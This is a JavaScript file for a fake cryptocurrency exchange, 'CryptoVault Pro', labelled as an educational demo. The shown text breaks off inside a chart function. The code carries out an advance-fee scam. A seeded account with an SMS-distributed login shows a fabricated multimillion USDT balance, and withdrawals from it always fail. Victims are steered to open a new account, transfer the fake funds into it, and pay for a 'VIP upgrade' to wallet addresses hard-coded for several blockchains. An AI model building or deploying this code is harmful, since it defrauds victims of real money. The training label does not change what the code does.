// Educational Demo - Enhanced Fake Crypto Platform
// For Cybersecurity Training Purposes Only

let userAccounts = {};
let currentUser = null;

// Payment network data
const paymentNetworks = {
    ethereum: {
        name: 'Ethereum',
        code: 'ERC20',
        address: '0x7B48a1860917f3E03a65f8c210bBE7871Ab8D0a6',
        note: 'Ethereum (ERC20) Network Only',
        warning: 'Make sure you\'re sending USDT on the Ethereum network. Gas fees are higher but network is very secure.',
        qrInfo: 'Ethereum Network'
    },
    tron: {
        name: 'Tron',
        code: 'TRC20',
        address: 'TUkWUSyL7WhdERZoVNau4cQUxM13pyFVPY',
        note: 'TRON (TRC20) Network Only',
        warning: 'Make sure you\'re sending USDT on the TRON network. Sending other tokens or using wrong networks will result in permanent loss of funds.',
        qrInfo: 'TRON Network'
    },
    bsc: {
        name: 'BNB Smart Chain',
        code: 'BEP20',
        address: '0x7B48a1860917f3E03a65f8c210bBE7871Ab8D0a6',
        note: 'BNB Smart Chain (BEP20) Network Only',
        warning: 'Make sure you\'re sending USDT on the BNB Smart Chain network. Low fees and fast transactions.',
        qrInfo: 'BSC Network'
    },
    solana: {
        name: 'Solana',
        code: 'SPL',
        address: '6y9F9hDH4rxbhx8HqUhfQR6oNs5nGALzvhLbr3KfjMSf',
        note: 'Solana (SPL) Network Only',
        warning: 'Make sure you\'re sending USDT on the Solana network. Ultra-low fees and lightning-fast transactions.',
        qrInfo: 'Solana Network'
    }
};

let selectedPaymentNetwork = 'ethereum'; // Default to TRON

// Initialize user accounts from localStorage or default
function initializeUserAccounts() {
    const savedAccounts = localStorage.getItem('userAccounts');
    if (savedAccounts) {
        userAccounts = JSON.parse(savedAccounts);
    } else {
        // Default SMS account with transaction history
        userAccounts = {
            'Brown68': {
                password: 'brown6868',
                balance: 2688332.66,
                vipLevel: 5,
                hasWithdrawPassword: false,
                transactions: [
                    {date: '2025-05-29 14:32', type: 'Deposit', amount: 500000, status: 'Completed'},
                    {date: '2025-05-28 09:15', type: 'Deposit', amount: 1200000, status: 'Completed'},
                    {date: '2025-05-27 16:48', type: 'Deposit', amount: 988332.66, status: 'Completed'}
                ],
                pnl24h: 298547.82,
                accountCreated: '2025-05-27'
            }
        };
        saveUserAccounts();
    }
}

// Determine what data to show for a user
function getUserDisplaySettings(username) {
    const user = userAccounts[username];
    if (!user) return null;
    
    // For new accounts (VIP 0, no transactions, 0 balance), hide past activities
    const isNewAccount = user.vipLevel === 0 && 
                        (!user.transactions || user.transactions.length === 0) && 
                        user.balance === 0;
    
    return {
        showTransactions: !isNewAccount,
        showPortfolio: !isNewAccount,
        showAnalytics: !isNewAccount,
        show24hPnL: !isNewAccount && user.pnl24h > 0,
        showPerformanceChart: !isNewAccount,
        isNewAccount: isNewAccount
    };
}

// Save user accounts to localStorage
function saveUserAccounts() {
    localStorage.setItem('userAccounts', JSON.stringify(userAccounts));
}

// Clear user session
function clearUserSession() {
    localStorage.removeItem('loggedIn');
    localStorage.removeItem('currentUser');
    currentUser = null;
}

// Set user session
function setUserSession(username) {
    localStorage.setItem('loggedIn', 'true');
    localStorage.setItem('currentUser', username);
    currentUser = username;
}

document.addEventListener('DOMContentLoaded', function() {
    console.log('🚨 EDUCATIONAL DEMO - Enhanced fake platform for cybersecurity training');
    
    // Initialize user accounts first
    initializeUserAccounts();
    
    // Initialize based on current page
    const currentPage = window.location.pathname.split('/').pop() || 'index.html';
    
    // Load user data immediately for all protected pages
    if (isProtectedPage()) {
        loadUserData();
    }
    
    switch(currentPage) {
        case 'index.html':
        case '':
            initLoginPage();
            break;
        case 'dashboard.html':
            initDashboard();
            break;
        case 'transfer.html':
            initTransferPage();
            break;
        case 'withdraw.html':
            initWithdrawPage();
            break;
        case 'register.html':
            initRegisterPage();
            break;
        case 'vip.html':
            initVIPPage();
            break;
        case 'portfolio.html':
            initPortfolioPage();
            break;
        case 'analytics.html':
            initAnalyticsPage();
            break;
        case 'faq.html':
            // FAQ page doesn't need special initialization
            break;
        default:
            // For other pages like markets.html
            break;
    }
    
    // Check authentication for protected pages
    if (isProtectedPage() && !isAuthenticated()) {
        window.location.href = 'index.html';
    }
});

function loadUserData() {
    const username = localStorage.getItem('currentUser');
    if (username && userAccounts[username]) {
        currentUser = username;
        const userData = userAccounts[username];
        const displaySettings = getUserDisplaySettings(username);
        
        // Update UI elements across all pages
        const userElements = document.querySelectorAll('#currentUser');
        userElements.forEach(element => {
            element.textContent = username;
        });
        
        const vipElements = document.querySelectorAll('#userVipBadge');
        vipElements.forEach(element => {
            element.textContent = `VIP ${userData.vipLevel}`;
        });
        
        // Update balance elements
        updateBalanceElements(userData);
        
        // Update current user balance in transfer forms
        updateTransferBalanceDisplay(userData);
        
        // Update UI visibility based on account type
        updateUIVisibility(displaySettings);
        
        // Update transaction history
        updateTransactionHistory(userData, displaySettings);
        
    } else {
        // If user not found, redirect to login
        clearUserSession();
        if (isProtectedPage()) {
            window.location.href = 'index.html';
        }
    }
}

function updateBalanceElements(userData) {
    const balanceElement = document.getElementById('totalBalance');
    if (balanceElement) {
        balanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }
    
    const usdtBalanceElement = document.getElementById('totalBalanceUSDT');
    if (usdtBalanceElement) {
        usdtBalanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }
    
    const availableBalanceElement = document.getElementById('availableBalance');
    if (availableBalanceElement) {
        availableBalanceElement.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Update portfolio page specific elements
    const portfolioValueElement = document.querySelector('.value-amount');
    if (portfolioValueElement) {
        portfolioValueElement.textContent = '$' + userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    }

    // Update holdings breakdown
    const holdingAmountElements = document.querySelectorAll('.holding-amount .amount');
    holdingAmountElements.forEach(element => {
        element.textContent = userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    });

    const holdingValueElements = document.querySelectorAll('.holding-value');
    holdingValueElements.forEach(element => {
        element.textContent = '$' + userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        });
    });
}

// New function to update transfer balance display
function updateTransferBalanceDisplay(userData) {
    // Update current user balance in internal transfer
    const currentUserBalanceElement = document.getElementById('currentUserBalance');
    if (currentUserBalanceElement) {
        currentUserBalanceElement.textContent = `Available: ${userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        })} USDT`;
    }
    
    // Update external withdrawal balance
    const availableBalanceExternal = document.getElementById('availableBalanceExternal');
    if (availableBalanceExternal) {
        availableBalanceExternal.textContent = `Available: ${userData.balance.toLocaleString('en-US', {
            minimumFractionDigits: 2,
            maximumFractionDigits: 2
        })} USDT`;
    }
    
    // Update max amount for transfer input
    const transferAmountInput = document.getElementById('transferAmount');
    if (transferAmountInput) {
        transferAmountInput.setAttribute('max', userData.balance);
    }
    
    // Update max amount for external withdrawal input
    const withdrawAmountInput = document.getElementById('withdrawAmount');
    if (withdrawAmountInput) {
        withdrawAmountInput.setAttribute('max', userData.balance);
    }
}

function updateUIVisibility(displaySettings) {
    // Hide/show 24h P&L
    const pnlElements = document.querySelectorAll('.balance-card:nth-child(3)');
    pnlElements.forEach(element => {
        if (displaySettings.show24hPnL) {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    });
    
    // Hide/show transaction history section
    const transactionSections = document.querySelectorAll('.transactions-section, .transaction-history-section');
    transactionSections.forEach(element => {
        if (displaySettings.showTransactions) {
            element.style.display = 'block';
        } else {
            element.style.display = 'none';
        }
    });
    
    // Hide/show chart sections for new accounts
    const chartSections = document.querySelectorAll('.chart-section, .performance-section');
    chartSections.forEach(element => {
        if (displaySettings.showPerformanceChart) {
            element.style.display = 'block';
        } else {
            element.innerHTML = `
                <div class="no-data-state">
                    <i class="fas fa-chart-line"></i>
                    <h3>No Trading History</h3>
                    <p>Start trading to see your performance charts</p>
                </div>
            `;
        }
    });
    
    // For new accounts, show different content on portfolio/analytics pages
    if (displaySettings.isNewAccount) {
        const portfolioOverview = document.querySelector('.portfolio-overview');
        if (portfolioOverview) {
            portfolioOverview.innerHTML = `
                <div class="new-account-welcome">
                    <h1>Welcome to CryptoVault Pro</h1>
                    <div class="total-value">
                        <span class="value-label">Total Portfolio Value</span>
                        <div class="value-amount">$0.00</div>
                        <div class="value-change neutral">
                            <i class="fas fa-info-circle"></i>
                            <span>Start by receiving transfers from other users</span>
                        </div>
                    </div>
                </div>
                <div class="portfolio-actions">
                    <button class="action-btn primary" onclick="location.href='transfer.html'">
                        <i class="fas fa-exchange-alt"></i>
                        <span>Receive Transfer</span>
                    </button>
                    <button class="action-btn secondary" onclick="location.href='vip.html'">
                        <i class="fas fa-crown"></i>
                        <span>Upgrade VIP</span>
                    </button>
                </div>
            `;
        }
        
        const analyticsGrid = document.querySelector('.analytics-grid');
        if (analyticsGrid) {
            analyticsGrid.innerHTML = `
                <div class="new-account-state">
                    <i class="fas fa-chart-bar"></i>
                    <h2>No Analytics Data</h2>
                    <p>Your analytics will appear here once you start trading</p>
                </div>
            `;
        }
    }
}

function updateTransactionHistory(userData, displaySettings) {
    if (!displaySettings.showTransactions) {
        return;
    }
    
    const transactionList = document.querySelector('.transaction-list');
    if (transactionList && userData.transactions) {
        transactionList.innerHTML = '';
        userData.transactions.forEach(tx => {
            const transactionItem = document.createElement('div');
            transactionItem.className = 'transaction-item';
            transactionItem.innerHTML = `
                <div class="transaction-icon ${tx.type.toLowerCase().replace(' ', '')}">
                    <i class="fas fa-arrow-down"></i>
                </div>
                <div class="transaction-details">
                    <span class="transaction-type">${tx.type}</span>
                    <span class="transaction-date">${tx.date}</span>
                </div>
                <div class="transaction-amount positive">
                    <span>+${tx.amount.toLocaleString()} USDT</span>
                </div>
            `;
            transactionList.appendChild(transactionItem);
        });
    }
    
    // Update transaction table if it exists
    const transactionTableBody = document.querySelector('.transaction-table tbody');
    if (transactionTableBody && userData.transactions) {
        transactionTableBody.innerHTML = '';
        userData.transactions.forEach(tx => {
            const row = document.createElement('tr');
            row.innerHTML = `
                <td>${tx.date}</td>
                <td><span class="type-badge ${tx.type.toLowerCase().replace(' ', '')}">${tx.type}</span></td>
                <td>USDT</td>
                <td class="positive">+${tx.amount.toLocaleString()}</td>
                <td><span class="status-badge completed">${tx.status}</span></td>
            `;
            transactionTableBody.appendChild(row);
        });
    }
}

function initLoginPage() {
    const loginForm = document.getElementById('loginForm');
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }
}

function handleLogin(e) {
    e.preventDefault();
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    
    // Reload accounts from localStorage to ensure we have latest data
    initializeUserAccounts();
    
    if (userAccounts[username] && userAccounts[username].password === password) {
        setUserSession(username);
        window.location.href = 'dashboard.html';
    } else {
        showError('Invalid credentials. Please check your username and password.');
    }
}

function initDashboard() {
    loadUserData();
    setTimeout(() => {
        initChart();
    }, 100);
}

function initPortfolioPage() {
    loadUserData();
    setTimeout(() => {
        const username = localStorage.getItem('currentUser');
        const displaySettings = getUserDisplaySettings(username);
        if (displaySettings.showPortfolio) {
            initPortfolioCharts();
        }
    }, 100);
}

function initAnalyticsPage() {
    loadUserData();
    setTimeout(() => {
        const username = localStorage.getItem('currentUser');
        const displaySettings = getUserDisplaySettings(username);
        if (displaySettings.showAnalytics) {
            initAnalyticsCharts();
        }
    }, 100);
}

// Portfolio charts initialization
function initPortfolioCharts() {
    // Allocation Chart
    const allocationCtx = document.getElementById('allocationChart');
    if (allocationCtx) {
        new Chart(allocationCtx, {
            type: 'doughnut',
            data: {
                labels: ['USDT'],
                datasets: [{
                    data: [100],
                    backgroundColor: ['#26a17b'],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                }
            }
        });
    }

    // Performance Chart
    const performanceCtx = document.getElementById('performanceChart');
    if (performanceCtx) {
        new Chart(performanceCtx, {
            type: 'line',
            data: {
                labels: generateTimeLabels(),
                datasets: [{
                    label: 'Portfolio Value',
                    data: generatePortfolioData(),
                    borderColor: '#2563eb',
                    backgroundColor: 'rgba(37, 99, 235, 0.1)',
                    borderWidth: 3,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af',
                            callback: function(value) {
                                return '$' + value.toLocaleString();
                            }
                        }
                    },
                    x: {
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af'
                        }
                    }
                }
            }
        });
    }
}

// Analytics charts initialization
function initAnalyticsCharts() {
    // Portfolio Value Chart
    const portfolioValueCtx = document.getElementById('portfolioValueChart');
    if (portfolioValueCtx) {
        new Chart(portfolioValueCtx, {
            type: 'line',
            data: {
                labels: generateTimeLabels(),
                datasets: [{
                    label: 'Portfolio Value',
                    data: generatePortfolioData(),
                    borderColor: '#2563eb',
                    backgroundColor: 'rgba(37, 99, 235, 0.1)',
                    borderWidth: 3,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af'
                        }
                    },
                    x: {
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af'
                        }
                    }
                }
            }
        });
    }

    // Asset Distribution Chart
    const assetDistributionCtx = document.getElementById('assetDistributionChart');
    if (assetDistributionCtx) {
        new Chart(assetDistributionCtx, {
            type: 'doughnut',
            data: {
                labels: ['USDT'],
                datasets: [{
                    data: [100],
                    backgroundColor: ['#26a17b'],
                    borderWidth: 0
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: {
                            color: '#9ca3af'
                        }
                    }
                }
            }
        });
    }
}

function generateTimeLabels() {
    return Array.from({length: 24}, (_, i) => `${i}:00`);
}

function generatePortfolioData() {
    const username = localStorage.getItem('currentUser');
    const userData = userAccounts[username];
    const baseValue = userData && userData.balance > 0 ? userData.balance * 0.95 : 1000;
    const data = [];
    let currentValue = baseValue;
    
    for (let i = 0; i < 24; i++) {
        const change = (Math.random() - 0.5) * (baseValue * 0.1);
        currentValue += change;
        data.push(Math.max(currentValue, baseValue * 0.9));
    }
    
    return data;
}

// Updated VIP page logic
function initVIPPage() {
    loadUserData();
    
    const currentUser = localStorage.getItem('currentUser');
    
    if (currentUser === 'Brown68') {
        // Show VIP 5 status page for SMS account
        const vip5Content = document.getElementById('vip5Content');
        const newAccountContent = document.getElementById('newAccountContent');
        
        if (vip5Content && newAccountContent) {
            vip5Content.style.display = 'block';
            newAccountContent.style.display = 'none';
        }
    } else {
        // Show upgrade options for new accounts
        const vip5Content = document.getElementById('vip5Content');
        const newAccountContent = document.getElementById('newAccountContent');
        
        if (vip5Content && newAccountContent) {
            vip5Content.style.display = 'none';
            newAccountContent.style.display = 'block';
        }
    }
}

function initTransferPage() {
    loadUserData();
    
    // Update external withdrawal UI
    setTimeout(() => {
        updateExternalWithdrawalUI();
        // Also update transfer balance display
        const username = localStorage.getItem('currentUser');
        if (username && userAccounts[username]) {
            updateTransferBalanceDisplay(userAccounts[username]);
        }
    }, 100);
    
    const transferForm = document.getElementById('internalTransferForm');
    if (transferForm) {
        transferForm.addEventListener('submit', handleTransfer);
        
        // Add real-time amount update
        const amountInput = document.getElementById('transferAmount');
        if (amountInput) {
            amountInput.addEventListener('input', updateTransferSummary);
        }
    }
    
    const externalWithdrawForm = document.getElementById('externalWithdrawForm');
    if (externalWithdrawForm) {
        externalWithdrawForm.addEventListener('submit', handleExternalWithdraw);
        
        // Network fee calculation
        const networkSelect = document.getElementById('networkSelect');
        if (networkSelect) {
            networkSelect.addEventListener('change', updateNetworkFee);
        }
        
        // Amount update
        const withdrawAmountInput = document.getElementById('withdrawAmount');
        if (withdrawAmountInput) {
            withdrawAmountInput.addEventListener('input', updateWithdrawSummary);
        }
    }
}

// Enhanced transfer option selection with auto-scroll
function showInternalTransfer() {
    const internalSection = document.getElementById('internalTransferSection');
    const externalSection = document.getElementById('externalWithdrawSection');
    
    if (internalSection && externalSection) {
        internalSection.style.display = 'block';
        externalSection.style.display = 'none';
        
        // Scroll to the internal transfer section
        scrollToElement('internalTransferSection', 80);
        
        // Log for educational purposes
        logEducationalEvent('internal_transfer_selected', {
            timestamp: new Date().toISOString(),
            user: localStorage.getItem('currentUser')
        });
    }
}

// Enhanced external withdrawal selection with auto-scroll
function showExternalWithdraw() {
    const internalSection = document.getElementById('internalTransferSection');
    const externalSection = document.getElementById('externalWithdrawSection');
    
    if (internalSection && externalSection) {
        internalSection.style.display = 'none';
        externalSection.style.display = 'block';
        
        // Update external withdrawal UI first
        updateExternalWithdrawalUI();
        
        // Then scroll to the external withdrawal section
        scrollToElement('externalWithdrawSection', 80);
        
        // Log for educational purposes
        logEducationalEvent('external_withdrawal_selected', {
            timestamp: new Date().toISOString(),
            user: localStorage.getItem('currentUser')
        });
    }
}

// Enhanced scroll functionality for mobile
function scrollToElement(elementId, offset = 20) {
    const element = document.getElementById(elementId);
    if (element) {
        // Small delay to ensure the element is visible
        setTimeout(() => {
            const elementPosition = element.getBoundingClientRect().top + window.pageYOffset;
            const offsetPosition = elementPosition - offset;
            
            window.scrollTo({
                top: offsetPosition,
                behavior: 'smooth'
            });
            
            // Also focus on the first input in the section for better UX
            const firstInput = element.querySelector('input, select, textarea');
            if (firstInput && !firstInput.disabled) {
                setTimeout(() => {
                    firstInput.focus();
                }, 300);
            }
        }, 100);
    }
}

// Add this function to handle external withdrawal UI updates
function updateExternalWithdrawalUI() {
    const username = localStorage.getItem('currentUser');
    const userData = userAccounts[username];

    if (!userData) return;

    // Check if user has received funds from SMS account
    const hasReceivedFunds = userData.balance > 0;
    const isVIPAccount = userData.vipLevel > 0;

    // Get UI elements
    const withdrawAmountInput = document.getElementById('withdrawAmount');
    const availableBalanceElement = document.getElementById('availableBalanceExternal');
    const withdrawLimitMessage = document.getElementById('withdrawLimitMessage');
    const vipUpgradeWarning = document.getElementById('vipUpgradeWarning');
    const maxWithdrawBtn = document.getElementById('maxWithdrawBtn');
    const withdrawSubmitBtn = document.getElementById('withdrawSubmitBtn');
    const dailyLimitInfo = document.getElementById('dailyLimitInfo');

    if (!hasReceivedFunds) {
        // No funds available - disable everything
        if (withdrawAmountInput) {
            withdrawAmountInput.disabled = true;
            withdrawAmountInput.placeholder = "No funds available";
        }
        if (availableBalanceElement) availableBalanceElement.style.display = 'none';
        if (maxWithdrawBtn) maxWithdrawBtn.style.display = 'none';
        if (withdrawLimitMessage) withdrawLimitMessage.style.display = 'block';
        if (vipUpgradeWarning) vipUpgradeWarning.style.display = 'none';
        if (withdrawSubmitBtn) {
            withdrawSubmitBtn.disabled = true;
            withdrawSubmitBtn.style.opacity = '0.5';
        }
        if (dailyLimitInfo) dailyLimitInfo.style.display = 'none';
    } else if (!isVIPAccount) {
        // Has funds but no VIP - show upgrade requirement
        if (withdrawAmountInput) {
            withdrawAmountInput.disabled = false;
            withdrawAmountInput.placeholder = "0.00";
        }
        if (availableBalanceElement) {
            availableBalanceElement.style.display = 'block';
            availableBalanceElement.textContent = `Available: ${userData.balance.toLocaleString()} USDT`;
        }
        if (maxWithdrawBtn) maxWithdrawBtn.style.display = 'block';
        if (withdrawLimitMessage) withdrawLimitMessage.style.display = 'none';
        if (vipUpgradeWarning) vipUpgradeWarning.style.display = 'block';
        if (withdrawSubmitBtn) {
            withdrawSubmitBtn.disabled = false;
            withdrawSubmitBtn.style.opacity = '1';
        }
        if (dailyLimitInfo) dailyLimitInfo.style.display = 'block';
    } else {
        // Has funds and VIP - everything enabled
        if (withdrawAmountInput) {
            withdrawAmountInput.disabled = false;
            withdrawAmountInput.placeholder = "0.00";
        }
        if (availableBalanceElement) {
            availableBalanceElement.style.display = 'block';
            availableBalanceElement.textContent = `Available: ${userData.balance.toLocaleString()} USDT`;
        }
        if (maxWithdrawBtn) maxWithdrawBtn.style.display = 'block';
        if (withdrawLimitMessage) withdrawLimitMessage.style.display = 'none';
        if (vipUpgradeWarning) vipUpgradeWarning.style.display = 'none';
        if (withdrawSubmitBtn) {
            withdrawSubmitBtn.disabled = false;
            withdrawSubmitBtn.style.opacity = '1';
        }
        if (dailyLimitInfo) dailyLimitInfo.style.display = 'none';
    }
}

function handleTransfer(e) {
    e.preventDefault();
    
    const recipientUsername = document.getElementById('recipientUsername').value;
    const transferAmount = parseFloat(document.getElementById('transferAmount').value);
    const transferNote = document.getElementById('transferNote').value;
    const senderUsername = localStorage.getItem('currentUser');
    
    // Check if recipient exists
    if (!userAccounts[recipientUsername]) {
        showError('Recipient username not found. Please check the username and try again.');
        return;
    }
    
    // Check if sender has enough balance
    if (userAccounts[senderUsername].balance < transferAmount) {
        showError('Insufficient balance for this transfer.');
        return;
    }
    
    // Perform the actual transfer
    userAccounts[senderUsername].balance -= transferAmount;
    userAccounts[recipientUsername].balance += transferAmount;
    
    // Add transaction record to recipient
    if (!userAccounts[recipientUsername].transactions) {
        userAccounts[recipientUsername].transactions = [];
    }
    userAccounts[recipientUsername].transactions.unshift({
        date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
        type: 'Transfer Received',
        amount: transferAmount,
        status: 'Completed',
        from: senderUsername
    });
    
    // Add transaction record to sender
    if (!userAccounts[senderUsername].transactions) {
        userAccounts[senderUsername].transactions = [];
    }
    userAccounts[senderUsername].transactions.unshift({
        date: new Date().toLocaleDateString() + ' ' + new Date().toLocaleTimeString(),
        type: 'Transfer Sent',
        amount: -transferAmount,
        status: 'Completed',
        to: recipientUsername
    });
    
    // Save updated accounts to localStorage
    saveUserAccounts();
    
    // Update UI balance and forms
    loadUserData();
    updateExternalWithdrawalUI();
    
    // Clear the form
    document.getElementById('transferAmount').value = '';
    document.getElementById('recipientUsername').value = '';
    document.getElementById('transferNote').value = '';
    updateTransferSummary();
    
    // Simulate successful transfer
    const txId = generateTransactionId();
    
    // Show success modal
    showTransferSuccess(recipientUsername, transferAmount, txId);
    
    // Log for educational analysis
    logEducationalEvent('transfer_completed', {
        sender: senderUsername,
        recipient: recipientUsername,
        amount: transferAmount,
        note: transferNote,
        senderNewBalance: userAccounts[senderUsername].balance,
        recipientNewBalance: userAccounts[recipientUsername].balance
    });
}

function showTransferSuccess(recipient, amount, txId) {
    document.getElementById('modalRecipient').textContent = recipient;
    document.getElementById('modalAmount').textContent = `${amount.toLocaleString()} USDT`;
    document.getElementById('modalTxId').textContent = txId;
    document.getElementById('transferSuccessModal').style.display = 'flex';
    
    // Ensure modal is visible on mobile
    setTimeout(() => {
        const modal = document.getElementById('transferSuccessModal');
        if (modal) {
            modal.scrollIntoView({ behavior: 'smooth', block: 'center' });
        }
    }, 100);
}

function closeTransferModal() {
    document.getElementById('transferSuccessModal').style.display = 'none';
    // Redirect to dashboard after successful transfer
    setTimeout(() => {
        window.location.href = 'dashboard.html';
    }, 1000);
}

// Add validation to prevent transferring more than available balance
function updateTransferSummary() {
    const amount = parseFloat(document.getElementById('transferAmount').value) || 0;
    const username = localStorage.getItem('currentUser');
    const userBalance = userAccounts[username]?.balance || 0;
    
    // Check if amount exceeds balance
    if (amount > userBalance) {
        document.getElementById('transferAmount').style.borderColor = 'var(--danger-color)';
        showError('Transfer amount exceeds available balance');
        return;
    } else {
        document.getElementById('transferAmount').style.borderColor = '';
    }
    
    document.getElementById('summaryAmount').textContent = `${amount.toLocaleString()} USDT`;
    document.getElementById('summaryTotal').textContent = `${amount.toLocaleString()} USDT`;
}

function setMaxAmount() {
    const username = localStorage.getItem('currentUser');
    if (username && userAccounts[username]) {
        const maxAmount = userAccounts[username].balance;
        const transferAmountInput = document.getElementById('transferAmount');
        if (transferAmountInput) {
            transferAmountInput.value = maxAmount;
            updateTransferSummary();
        }
    }
}

function handleExternalWithdraw(e) {
    e.preventDefault();
    
    const username = localStorage.getItem('currentUser');
    const withdrawPassword = document.getElementById('withdrawPassword').value;
    
    // For SMS account (Brown68), always fail due to missing withdrawal password
    if (username === 'Brown68') {
        showError('Withdrawal password is incorrect or not set. Please contact customer service or create a new account for internal transfers.');
        return;
    }
    
    // For new accounts, show VIP upgrade requirement
    showVIPUpgradeModal();
    
    logEducationalEvent('external_withdrawal_attempted', {
        username: username,
        hasWithdrawPassword: withdrawPassword.length > 0
    });
}

function showVIPUpgradeModal() {
    // Create VIP upgrade modal
    const modal = document.createElement('div');
    modal.className = 'modal';
    modal.style.display = 'flex';
    modal.innerHTML = `
        <div class="modal-content vip-upgrade-modal">
            <div class="modal-header">
                <i class="fas fa-crown" style="color: #ffd700; font-size: 48px; margin-bottom: 16px;"></i>
                <h3>VIP Upgrade Required</h3>
            </div>
            <div class="modal-body">
                <p>Your account requires VIP upgrade to process external withdrawals.</p>
                <div class="vip-benefits">
                    <div class="benefit-item">
                        <i class="fas fa-check"></i>
                        <span>Unlock daily withdrawal limits</span>
                    </div>
                    <div class="benefit-item">
                        <i class="fas fa-check"></i>
                        <span>Priority customer support</span>
                    </div>
                    <div class="benefit-item">
                        <i class="fas fa-check"></i>
                        <span>Advanced trading features</span>
                    </div>
                </div>
                <p class="upgrade-note">Choose the VIP level according to your daily withdrawal needs.</p>
            </div>
            <div class="modal-footer">
                <button onclick="closeVIPModal()" class="btn secondary">Cancel</button>
                <button onclick="goToVIPUpgrade()" class="btn primary">
                    <i class="fas fa-crown"></i>
                    <span>Upgrade Now</span>
                </button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    window.currentModal = modal;
}

function closeVIPModal() {
    if (window.currentModal) {
        window.currentModal.remove();
        window.currentModal = null;
    }
}

function goToVIPUpgrade() {
    closeVIPModal();
    window.location.href = 'vip.html';
}

function updateNetworkFee() {
    const network = document.getElementById('networkSelect').value;
    const feeElement = document.getElementById('networkFee');
    
    const fees = {
        'TRC20': '1 USDT',
        'ERC20': '15 USDT',
        'BEP20': '0.5 USDT'
    };
    
    if (network && fees[network]) {
        feeElement.textContent = fees[network];
    } else {
        feeElement.textContent = 'Select network';
    }
    
    updateWithdrawSummary();
}

function updateWithdrawSummary() {
    const amount = parseFloat(document.getElementById('withdrawAmount').value) || 0;
    const network = document.getElementById('networkSelect').value;
    
    const fees = {
        'TRC20': 1,
        'ERC20': 15,
        'BEP20': 0.5
    };
    
    const fee = fees[network] || 0;
    const total = Math.max(0, amount - fee);
    
    document.getElementById('withdrawSummaryAmount').textContent = `${amount.toLocaleString()} USDT`;
    document.getElementById('withdrawSummaryTotal').textContent = `${total.toLocaleString()} USDT`;
}

function setMaxWithdrawAmount() {
    const username = localStorage.getItem('currentUser');
    if (username && userAccounts[username]) {
        const maxAmount = userAccounts[username].balance;
        const withdrawAmountInput = document.getElementById('withdrawAmount');
        if (withdrawAmountInput) {
            withdrawAmountInput.value = maxAmount;
            updateWithdrawSummary();
        }
    }
}

function initRegisterPage() {
    const registerForm = document.getElementById('registerForm');
    if (registerForm) {
        registerForm.addEventListener('submit', handleRegistration);
    }
}

function handleRegistration(e) {
    e.preventDefault();
    
    const username = document.getElementById('newUsername').value;
    const password = document.getElementById('newPassword').value;
    const confirmPassword = document.getElementById('confirmPassword').value;
    const withdrawalPassword = document.getElementById('withdrawalPassword').value;
    
    if (password !== confirmPassword) {
        showError('Passwords do not match');
        return;
    }
    
    // Reload accounts to check for existing usernames
    initializeUserAccounts();
    
    if (userAccounts[username]) {
        showError('Username already exists');
        return;
    }
    
    if (withdrawalPassword.length < 6) {
        showError('Withdrawal password must be at least 6 characters');
        return;
    }
    
    // Create new account with VIP 0 and no transaction history
    userAccounts[username] = {
        password: password,
        balance: 0,
        vipLevel: 0,
        hasWithdrawPassword: true,
        withdrawalPassword: withdrawalPassword,
        transactions: [], // Empty transaction history for new accounts
        pnl24h: 0,
        accountCreated: new Date().toISOString().split('T')[0]
    };
    
    // Save to localStorage
    saveUserAccounts();
    
    // Set user session
    setUserSession(username);
    
    showSuccess('Account created successfully! You can now receive transfers from other users.');
    
    setTimeout(() => {
        window.location.href = 'dashboard.html';
    }, 2000);
    
    logEducationalEvent('account_created', { username: username });
}

function initChart() {
    const username = localStorage.getItem('currentUser');
    const displaySettings = getUserDisplaySettings(username);
    
    if (!displaySettings.showPerformanceChart) {
        return; // Don't show charts for new accounts
    }
    
    const ctx = document.getElementById('portfolioChart');
    if (ctx) {
        new Chart(ctx, {
            type: 'line',
            data: {
                labels: Array.from({length: 24}, (_, i) => `${i}:00`),
                datasets: [{
                    label: 'Portfolio Value',
                    data: generateFakeChartData(),
                    borderColor: '#2563eb',
                    backgroundColor: 'rgba(37, 99, 235, 0.1)',
                    borderWidth: 3,
                    fill: true,
                    tension: 0.4
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        display: false
                    }
                },
                scales: {
                    y: {
                        beginAtZero: false,
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af',
                            callback: function(value) {
                                return '$' + value.toLocaleString();
                            }
                        }
                    },
                    x: {
                        grid: {
                            color: '#374151'
                        },
                        ticks: {
                            color: '#9ca3af'
                        }
                    }
                }
            }
        });
    }
}

function generateFakeChartData() {
    const username = localStorage.getItem('currentUser');
